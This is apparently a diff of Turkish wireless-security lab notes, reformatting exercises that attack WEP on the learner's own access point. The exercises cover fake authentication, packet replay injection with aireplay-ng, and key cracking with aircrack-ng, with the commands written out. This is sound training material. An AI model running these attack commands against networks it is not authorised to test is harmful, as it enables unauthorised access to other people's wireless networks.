@@ -77,14 +77,13 @@ Bu modülü tam olarak takip etmediyseniz, AP'nizin WEP şifrelemesi ve bağlı 
 Erişim noktanızı açık kimlik doğrulama ile WEP şifrelemesini kullanacak şekilde yapılandırın ve kurban istemcinizin erişim noktasıyla ilişkilendirildiğinden emin 
 olun.
 
-	• Kablosuz kartınızı AP kanalındaki izleme moduna yerleştirin ve bir Airodump çekimi başlatın.
-	• AP'ye karşı sahte bir kimlik doğrulama saldırısı gerçekleştirin. Sahte kimlik doğrulama saldırısını, zaman aşımına uğramaması için yeniden ilişkilendirme 
-    aralığı ile yürütmekten çekinmeyin.
+- Kablosuz kartınızı AP kanalındaki izleme moduna yerleştirin ve bir Airodump çekimi başlatın.
+- AP'ye karşı sahte bir kimlik doğrulama saldırısı gerçekleştirin. Sahte kimlik doğrulama saldırısını, zaman aşımına uğramaması için yeniden ilişkilendirme 
+  aralığı ile yürütmekten çekinmeyin.
  
-
-	1. airmon-ng start <interface> <AP Channel>
-	2. airodump-ng -c <AP Channel> --bssid <AP MAC> -w <capture> <interface> 
-	3. aireplay-ng -1 0 -e <ESSID> -a <AP MAC> -h <Your MAC> <interface> 
+# airmon-ng start <interface> <AP Channel>
+# airodump-ng -c <AP Channel> --bssid <AP MAC> -w <capture> <interface> 
+# aireplay-ng -1 0 -e <ESSID> -a <AP MAC> -h <Your MAC> <interface> 
 
 ---
 
@@ -93,15 +92,15 @@ olun.
 AP'nizin, bağlı bir kurban istemciyle WEP şifrelemesi için yapılandırıldığından emin olun. Kablosuz kartınızı monitör moduna yerleştirin ve henüz yapmadıysanız bir
 Airodump çekimi başlatın. Aireplay-ng'yi şu amaçlarla kullanın:
 
-• "Natural Packet Replay " özelliğini kullanarak ağa trafik enjekte edin
-• "Modified Packet Replay " özelliğini kullanarak ağa trafik enjekte edin
-• "Natural Packet Replay " saldırısı için iyi bir paket yakalama sürecini acele etmeye çalışın
+- "Natural Packet Replay " özelliğini kullanarak ağa trafik enjekte edin
+- "Modified Packet Replay " özelliğini kullanarak ağa trafik enjekte edin
+- "Natural Packet Replay " saldırısı için iyi bir paket yakalama sürecini acele etmeye çalışın
 
-	1. airmon-ng start <interface> <AP Channel>
-	2. airodump-ng -c <AP Channel> --bssid <AP MAC> -w <capture> <interface> 
-	3. aireplay-ng -2 -b <AP MAC> -d FF:FF:FF:FF:FF:FF -t 1 <interface> 
-	4. aireplay-ng -2 -b <AP MAC> -t 1 -c FF:FF:FF:FF:FF:FF -p 0841 <interface> 
-	5. aireplay-ng -2 -b <AP MAC> -d FF:FF:FF:FF:FF:FF -f 1 -m 68 -n 86 <interface> 
+# airmon-ng start <interface> <AP Channel>
+# airodump-ng -c <AP Channel> --bssid <AP MAC> -w <capture> <interface> 
+# aireplay-ng -2 -b <AP MAC> -d FF:FF:FF:FF:FF:FF -t 1 <interface> 
+# aireplay-ng -2 -b <AP MAC> -t 1 -c FF:FF:FF:FF:FF:FF -p 0841 <interface> 
+# aireplay-ng -2 -b <AP MAC> -d FF:FF:FF:FF:FF:FF -f 1 -m 68 -n 86 <interface> 
 
 ---
 
@@ -110,4 +109,4 @@ Airodump çekimi başlatın. Aireplay-ng'yi şu amaçlarla kullanın:
 Aircrack-ng'yi çalışan yakalamanıza karşı çalıştırın ve AP'lerinizin WEP anahtarını kırın. Çatlama hızlarındaki farkı görmek için farklı Aircrack seçenekleriyle 
 denemeler yapın.
 
-aircrack-ng -z -n 64 <capture>
+# aircrack-ng -z -n 64 <capture>
